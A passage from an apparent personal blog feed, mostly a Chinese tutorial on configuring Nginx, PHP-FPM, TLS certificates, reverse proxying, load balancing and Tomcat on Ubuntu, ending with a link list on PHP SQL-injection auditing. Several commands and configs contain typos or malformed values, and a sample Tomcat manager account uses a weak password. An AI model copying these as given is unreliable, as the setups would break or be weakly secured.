内容</span></span><br><span class="line">server&#123;</span><br><span class="line">    listen 80;   <span class="comment"># 因为这里都侦听80端口，所以为了和默认站点区分，要指定不同域名   </span></span><br><span class="line">    server_name www.qqq.com;   </span><br><span class="line">    root /var/www/qq.com;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 其他配置项可以取消注释自行配置</span></span><br><span class="line">location ~ /\.ht &#123;   <span class="comment"># 这个建议启用，以..开头,以ht结尾的你我们就拒绝访问--&gt;当然也可以增加更多策略</span></span><br><span class="line">   deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建启用的符号链接(Apache是site2enable，这里没有专门的命令)</span></span><br><span class="line">sudo ln -s /etc/nginx/sites-available/qq.com  /etc/nginx/sites-enabled/qq.com </span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">sudo systemctl restart nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问域名，就会访问到qq.com，因为请求中的host字段是不一样的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他站点同上</span></span><br></pre></td></tr></table></figure><h4 id="Nginx支持PHP"><a href="#Nginx支持PHP" class="headerlink" title="Nginx支持PHP"></a>Nginx支持PHP</h4><p>WebServer本身只是提供资源的，必须配合php等脚本才能进行逻辑的运算</p><p>1.安装fastCGI process manager(FPM)  –&gt; 就能配合Nginx配合进行处理(Nginx把接收到的请求转发给php处理)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php-fpm   <span class="comment"># 安装</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看位置  ls /var/run/php/</span></span><br><span class="line">/var/run/php/php7.2-fpm.sock  <span class="comment"># 进程名称(记住路径)</span></span><br><span class="line"><span class="comment"># 验证 </span></span><br><span class="line">php-v</span><br></pre></td></tr></table></figure></p><p>2.配置Nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改配置  sudo vim /etc/nginx/sites-available/qq.com</span></span><br><span class="line">location ~ \.php$ &#123;   <span class="comment"># 匹配所有访问.php的请求</span></span><br><span class="line">        include snippets/fastcgi-php.conf;</span><br><span class="line">        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;    <span class="comment"># 意思是: 把所有访问.php的拓展名的资源，都转发给这里pass的php进程</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 还有，索引页面也要添加 index.php</span></span><br></pre></td></tr></table></figure></p><p>3.配置PHP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/php/7.2/fpm/php.ini</span></span><br><span class="line"><span class="comment"># 这里只简单讲几个配置</span></span><br><span class="line">cgi.fix_pathinfo=0       <span class="comment"># 必须修改为0, 安全</span></span><br><span class="line">file_uploads = On         <span class="comment"># 如果不需要就关掉，看自己需求</span></span><br><span class="line">max_file_uploads = 20    <span class="comment"># 限制单个文件上传大小</span></span><br><span class="line">allow_url_fopen = On     <span class="comment"># 是否允许文件包含(如果没业务需要，建议关闭)</span></span><br><span class="line">allow_url_include = Off</span><br><span class="line">memory_limit = 128M      <span class="comment"># 指定内存大小(最小128M,看业务需求)</span></span><br></pre></td></tr></table></figure></p><p>4.重新加载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br><span class="line">sudo systemctl reload nginx</span><br><span class="line"><span class="comment"># 重启php</span></span><br><span class="line">sudo systemctl restart php7.2-fpm</span><br></pre></td></tr></table></figure></p><p>5.重新访问php页面，查看是否正确解析</p><h4 id="Nginx支持SSL"><a href="#Nginx支持SSL" class="headerlink" title="Nginx支持SSL"></a>Nginx支持SSL</h4><p><strong>自签名证书</strong> (自己测试或者不需要那么安全的情况下) –&gt; 机密性和完整性可以保证，但是身份认证是不会被公网所信任的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x509标准格式的, 私钥是绝对不能泄漏的, 后面是绑定的一个证书</span></span><br><span class="line">sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem</span><br><span class="line"><span class="comment"># 一旦域名绑定了证书，就必须通过这个域名来访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 若向CA证书颁发机构申请证书方法 同上Apache</span></span><br></pre></td></tr></table></figure></p><p>服务块配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/nginx/sites-available/qq.com</span></span><br><span class="line">server &#123;</span><br><span class="line">     listen 443 ssl;        <span class="comment"># 443端口是 ssl, 通过https访问</span></span><br><span class="line">     server_name www.qqq.com;</span><br><span class="line">     ssl_certificate /etc/ssl/certs/qq.pem;</span><br><span class="line">     ssl_certificate_key /etc/ssl/private/qq.key;</span><br><span class="line"></span><br><span class="line">     root /var/www/qq.com</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问https://xxxxxx    会发现浏览器会提示证书不信任</span></span><br></pre></td></tr></table></figure></p><p><strong>Let’s encrypt</strong><br>第三方的https的开源的免费证书颁发机构，向他来申请证书</p><p>1.安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:certbot/certbot  <span class="comment"># 添加仓库</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install cerbot    <span class="comment"># 客户端程序(简化了申请流程)</span></span><br><span class="line">sudo apt install python-cerbot-nginx</span><br></pre></td></tr></table></figure></p><p>2.使用方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提</span></span><br><span class="line">域名正常解析、设置好虚拟主机</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.1申请证书 (--nginx意思是给nginx用的， -d是域名,还有子域名) , -m是管理员邮箱</span></span><br><span class="line">sudo certbot --nginx -d example.com -d www.example.com -m admin@example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 证书存放位置</span></span><br><span class="line">/etc/letsencrypt/live</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.2修改自己配置文件中证书的位置</span></span><br><span class="line"><span class="comment"># sudo vim /etc/nginx/sites-available/qq.com</span></span><br><span class="line">ssl_certificate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.3 手动证书更新(因为默认证书有效期是90天)</span></span><br><span class="line">sudo certbot renew --dry-run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.4测试 查看证书状态(输入自己的域名) 可以查看到一些安全隐患等详细信息</span></span><br><span class="line">https://www.ssllab.com/ssltest/</span><br><span class="line"><span class="comment"># ssl的信息扫描(不安全的地方)也可以使用自己本地的工具</span></span><br></pre></td></tr></table></figure></p><h4 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h4><blockquote><p>很多情况下，Nginx不是作为WebServer使用的，最常见的就是作为<code>反向代理</code></p></blockquote><p>首先说一下<code>代理</code>:     代理客户端访问外网服务器。代理是重新生成的请求(比如公司内部限制员工上网的场景)<br><code>反向代理</code>：</p><pre><code>- 代理服务器对外提供服务，接受客户端请求- 安全层过滤客户端恶意请求(云)- 可以放在防火墙外面，甚至放在云上(云WAF本质上就是反向代理, 请求通过DNS解析到云waf上，进行过滤)</code></pre><ul><li>Apache不适用于高并发，高负载环境</li><li>Nginx没有内建支持动态内容处理能力</li></ul><p><strong>结合Apache/Nginx的优势</strong></p><ul><li>Nginx接受入站请求和静态内容缓存，动态请求发给Apache</li><li>Apache完成动态内容处理</li><li>Nginx作为反向代理（动态请求转发给Apache）</li><li>Nginx放在WebServer前面，再将请求发给WebServer。然后服务端把数据通过Nginx向用户交付数据</li><li>不仅减缓了Apache的流量压力，也进行了一定的安全过滤</li></ul><h4 id="Nginx实现反向代理"><a href="#Nginx实现反向代理" class="headerlink" title="Nginx实现反向代理"></a>Nginx实现反向代理</h4><blockquote><p>同一台服务器的流量转发</p></blockquote><p>1.本机安装Apache<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意: 先停掉nginx的服务</span><br><span class="line">systemctl stop nginx</span><br><span class="line">再安装</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></p><p>2.修改Apache侦听端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line"><span class="comment"># vim /etc/apache2/ports.conf</span></span><br><span class="line"><span class="comment">#让apache不占用80, 让nginx侦听80端口</span></span><br><span class="line"> Listen 8080</span><br><span class="line">&lt;IfModule ssl_module&gt;</span><br><span class="line">   Listen 8443</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;IfModule mod_gnutls.c&gt;</span><br><span class="line">    Listen 8443</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">2.修改apache虚拟站点默认侦听端口</span><br><span class="line">vim /etc/apache2/sites-available/000-default.conf</span><br><span class="line">也改为8080</span><br><span class="line"></span><br><span class="line">3.重启服务</span><br><span class="line">systemctl restart apache2</span><br></pre></td></tr></table></figure></p><p>3.Nginx反向代理设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nginx/sites-available/default</span></span><br><span class="line"><span class="comment">#修改nginx配置，侦听80端口，然后动态部分的流量转发给apache,而静态文件还是放Nginx上读取(这里以php为例)</span></span><br><span class="line"><span class="comment"># 动态内容进行转发</span></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">     include snippets/fastcgi-php.conf;</span><br><span class="line">     <span class="comment"># fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;   # 这里就不用nginx解析php了，用apache(配置在上面小结)</span></span><br><span class="line">     proxy_pass  http://127.0.0.1:8080;  <span class="comment"># 凡是php的动态内容都转发给本机的8080(即Apache)</span></span><br><span class="line">     proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;  <span class="comment"># 通常会添加一些代理请求头(便于区分)</span></span><br><span class="line">     proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>; <span class="comment"># 这个头部虽然不是RFC标准，但是也是记录了经过了哪些代理地址</span></span><br><span class="line">     proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">    proxy_set_header X-Forward-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 静态内容留给自己（增加一个location）      </span></span><br><span class="line">location ~* \.(js|css|jpg|png|svg|html|htm)$ &#123;</span><br><span class="line">   expires 10d;   <span class="comment"># 指定过期时间 10天</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4.检查Nginx配置并重启<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t  <span class="comment"># 检查配置语法</span></span><br><span class="line">sudo systemctl restart nginx  <span class="comment"># 重启</span></span><br></pre></td></tr></table></figure></p><p>5.配置Apache支持php解析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.安装</span></span><br><span class="line">sudo apt install php7.2 libapache2-mod-php7.2   <span class="comment"># mod-php模块</span></span><br><span class="line"><span class="comment"># 验证 </span></span><br><span class="line">php -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.启用模块</span></span><br><span class="line">a2enmod php7.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.索引文件</span></span><br><span class="line">vim  /etc/apache2/mods-available/dir.conf       <span class="comment"># 增加index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.重启apache</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure></p><p>6.测试能否正常访问</p><h4 id="多台服务器的Nginx反响代理，进行流量转发"><a href="#多台服务器的Nginx反响代理，进行流量转发" class="headerlink" title="多台服务器的Nginx反响代理，进行流量转发"></a>多台服务器的Nginx反响代理，进行流量转发</h4><p>实验环境：一台ubuntu安装apache, 两台虚拟机安装Nginx<br>客户端向第一台Nginx服务器发送请求，转发给第二台Nginx服务器，然后转发给最后一台Apache<br>链式代理</p><p><strong>1.Nginx机器 N1</strong><br>1.安装Nginx<br>2.配置(这里做实验就简单地用了默认的配置了)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/default</span></span><br><span class="line">location / &#123;   <span class="comment"># 所有发到我这里的请求都转发给N2</span></span><br><span class="line">    proxy_pass http://192.168.0.104;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3.重启Nginx</p><p><strong>2.Nginx机器 N2</strong><br>1.安装Nginx<br>2.配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/default</span></span><br><span class="line">location / &#123;   <span class="comment"># 所有发到我这里的请求都转发给N2</span></span><br><span class="line">    proxy_pass http://192.168.0.105;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3.重启Nginx</p><p><strong>3.Apache机器 A3</strong><br>安装apache<br>然后客户端访问N1, 就会看到A3的页面</p><h4 id="Nginx负载均衡"><a href="#Nginx负载均衡" class="headerlink" title="Nginx负载均衡"></a>Nginx负载均衡</h4><blockquote><p>基于反向代理实现负载均衡</p></blockquote><p><strong>负载均衡：</strong> 前面放一个Nginx进行反向代理，后面放多个Apache作为WebServer</p><p><strong>基本配置</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个服务器组(要转发到的目标组)</span></span><br><span class="line">upstream srvs &#123;  <span class="comment"># upstream只是一个组的名称</span></span><br><span class="line">    least_conn;        <span class="comment"># 负载均衡方法规则 --最少连接数优先 (详细见下面)</span></span><br><span class="line">    server 192.168.106:80  weight=1;  <span class="comment"># server 是后面的一个WebServer(apache或Nginx)的地址， weight 是权重(越大接收的流量就越多)</span></span><br><span class="line">    server 192.168.106:80  weight=2;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://srvs;   <span class="comment"># 上面定义的组的名称(不需要被DNS解析，仅仅是一个标识)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>负载均衡方法</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">round-robin       <span class="comment"># 论询</span></span><br><span class="line">least_conn        <span class="comment"># 最少连接数优先(已经建立的连接数)</span></span><br><span class="line">least_time        <span class="comment"># 响应速度最快</span></span><br><span class="line"><span class="built_in">hash</span>              <span class="comment"># 基于请求的Hash值</span></span><br><span class="line">ip_hash           <span class="comment"># 基于ip地址的hash值(适用于需要会话保持的场景)</span></span><br></pre></td></tr></table></figure></p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/nginx/error.log</span><br></pre></td></tr></table></figure><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a><font color="red">Tomcat</font></h2><p>Tomcat是由Apache组织开发的一个Servlet(Server Applet)容器</p><ul><li>实现对servlet, JSP, JAVA Socket等支持</li><li>包含http服务器</li><li>作为中间件使用</li><li>可与Nginx结合使用(只用Tomcat的话, 抗压能力强)</li></ul><p>servlet是优于CGI的方式的</p><h6 id="安装-open-jdk"><a href="#安装-open-jdk" class="headerlink" title="安装 open jdk"></a>安装 open jdk</h6><p>一般tomcat和java配合较多<br>jdk是开发环境，jre是运行环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install default-jdk  <span class="comment">#安装openjdk。 使用默认版本 或者指定openjdk-8-jdk</span></span><br></pre></td></tr></table></figure></p><h6 id="安装-oracle-jdk"><a href="#安装-oracle-jdk" class="headerlink" title="安装 oracle jdk"></a>安装 oracle jdk</h6><p>安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install software-properties-common -y</span><br><span class="line">sudo add-apt-repository ppa:webupd8team/java</span><br><span class="line">sudo apt install oracle-java8-installer -y</span><br></pre></td></tr></table></figure></p><p>java版本选择<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br><span class="line">sudo update-alternatives --config javac</span><br><span class="line"></span><br><span class="line">java --version</span><br></pre></td></tr></table></figure></p><p>或者手动下载oracle jdk包</p><h6 id="官方库安装tomcat"><a href="#官方库安装tomcat" class="headerlink" title="官方库安装tomcat"></a>官方库安装tomcat</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ubuntu中收录的8</span></span><br><span class="line">sudo apt install tomcat8</span><br><span class="line">sudo apt install tomcat8-docs</span><br><span class="line">sudo apt install tomcat8-admin</span><br><span class="line">sudo apt install tomcat8-examples</span><br><span class="line"></span><br><span class="line"><span class="comment"># tomcat默认不是主要作为WebServer的，一般是配合Apache和Nginx，所以默认使用8080端口</span></span><br></pre></td></tr></table></figure><h6 id="手动安装tomcat"><a href="#手动安装tomcat" class="headerlink" title="手动安装tomcat"></a>手动安装tomcat</h6><p>适用于指定具体版本<br>1.先安装jdk<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt install default-jdk  <span class="comment">#安装openjdk。 使用默认版本 或者指定openjdk-8-jdk   </span></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">java --version</span><br><span class="line"></span><br><span class="line">sudo useradd -m -U -d /opt/tomcat -s /bin/<span class="literal">false</span> tomcat       <span class="comment"># 创建tomcat帐号（home放在opt下面）</span></span><br></pre></td></tr></table></figure></p><p>2.再下载安装包<br><img src="/ubuntu-server-Web服务/20200428150102394_2075358316.png =700x" alt></p><p>3.移动到/opt/tomcat目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv apache-tomcat-8.5.31 /opt/tomcat/</span><br></pre></td></tr></table></figure></p><p>4.修改该文件递归的属主属组改为新建的<code>tomcat</code>用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建议建立符号链接 </span></span><br><span class="line">sudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest  <span class="comment"># 把新版本添加链接即可(版本更新之后不需要更改配置文件，配置文件都配置latest,而只需把latest修改指向即可)</span></span><br><span class="line"></span><br><span class="line">sudo chown -R tomcat:/opt/tomcat</span><br><span class="line">sudo chmod +x /opt/tomcat/latest/bin/*.sh</span><br><span class="line"><span class="comment"># sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh</span></span><br></pre></td></tr></table></figure></p><ol start="5"><li>手动创建systemd管理文件(手动安装就没有systemd的后台管理文件)<br><code>/etc/systemd/system/</code><br><code>sudo vim tomcat.service</code><br>配置内容如下<br><img src="/ubuntu-server-Web服务/20200428152651153_2000734872.png" alt></li></ol><p>6.启动服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新reload</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"><span class="comment"># 启动tomcat</span></span><br><span class="line">sudo systemctl start tomcat</span><br><span class="line">sudo systemctl status tomcat</span><br><span class="line"><span class="comment"># 设置开机启动启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> tomcat</span><br></pre></td></tr></table></figure></p><p>7.Web管理接口配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://ip:8080/manager/</span></span><br><span class="line"><span class="comment"># tomcat管理页面，默认是只允许本机访问的</span></span><br><span class="line"><span class="comment">## 1.若想开启，就需进行配置（这里指定允许某个ip访问）</span></span><br><span class="line">sudo vim /opt/tomcat/latest/conf/tomcat-user.xml       <span class="comment"># 自动安装tomcat后的路径在/etc</span></span><br><span class="line">&lt;tomcat-user&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">"admin-gui"</span>/&gt;    <span class="comment"># 定义两个角色</span></span><br><span class="line">    &lt;role rolename=<span class="string">"manager-gui"</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">"admin"</span> password=<span class="string">"qwe123"</span> roles=<span class="string">"admin-gui, manager-gui"</span>/&gt;   <span class="comment"># 定义用户</span></span><br><span class="line">&lt;/tomcat-user&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.指定登录主机</span></span><br><span class="line"><span class="comment"># sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml   #  自动安装tomcat后的路径自己找</span></span><br><span class="line">如下图(懒得弄格式了)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml</span></span><br><span class="line">这是管理主机的配置文件</span><br><span class="line"></span><br><span class="line"><span class="comment">## 3.重启服务，然后测试</span></span><br><span class="line">systemctl restart tomcat8</span><br><span class="line">xxx:8080/manager/html        <span class="comment"># 管理页面就可以部署war包等操</span></span><br><span class="line">xxx:8080/host-manager/html</span><br></pre></td></tr></table></figure></p><p><img src="/ubuntu-server-Web服务/20200428154603944_415659665.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WWW介绍&quot;&gt;&lt;a href=&quot;#WWW介绍&quot; class=&quot;headerlink&quot; title=&quot;WWW介绍&quot;&gt;&lt;/a&gt;&lt;font color=&quot;red&quot;&gt;WWW介绍&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;www 万维网&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态网站：所有人看到的内
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="Ubuntu" scheme="http://www.xpshuai.cn/tags/Ubuntu/"/>
    
      <category term="Web服务" scheme="http://www.xpshuai.cn/tags/Web%E6%9C%8D%E5%8A%A1/"/>
    
      <category term="Apache" scheme="http://www.xpshuai.cn/tags/Apache/"/>
    
      <category term="Nginx" scheme="http://www.xpshuai.cn/tags/Nginx/"/>
    
      <category term="Tomcat" scheme="http://www.xpshuai.cn/tags/Tomcat/"/>
    
      <category term="反向代理" scheme="http://www.xpshuai.cn/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【PHP代码审计】 那些年我们一起挖掘SQL注入--集合</title>
    <link href="http://www.xpshuai.cn/%E3%80%90PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%8C%96%E6%8E%98SQL%E6%B3%A8%E5%85%A5-%E9%9B%86%E5%90%88/"/>
    <id>http://www.xpshuai.cn/【PHP代码审计】-那些年我们一起挖掘SQL注入-集合/</id>
    <published>2020-04-17T12:10:37.000Z</published>
    <updated>2020-05-17T20:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="仅仅是简单把网上的文章放在一起，方便自己学习"><a href="#仅仅是简单把网上的文章放在一起，方便自己学习" class="headerlink" title="仅仅是简单把网上的文章放在一起，方便自己学习"></a>仅仅是简单把网上的文章放在一起，方便自己学习</h6><ol><li><a href="https://www.cnblogs.com/xiaozi/p/5538369.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5538369.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/5538372.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5538372.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/5538374.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5538374.html</a></li><li><a href="http://www.mamicode.com/info-detail-1391858.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1391858.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/5538380.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5538380.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/5538382.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/5538382.html</a></li><li><a href="https://www.cnblogs.com/chunguang/p/5583875.html" target="_blank" 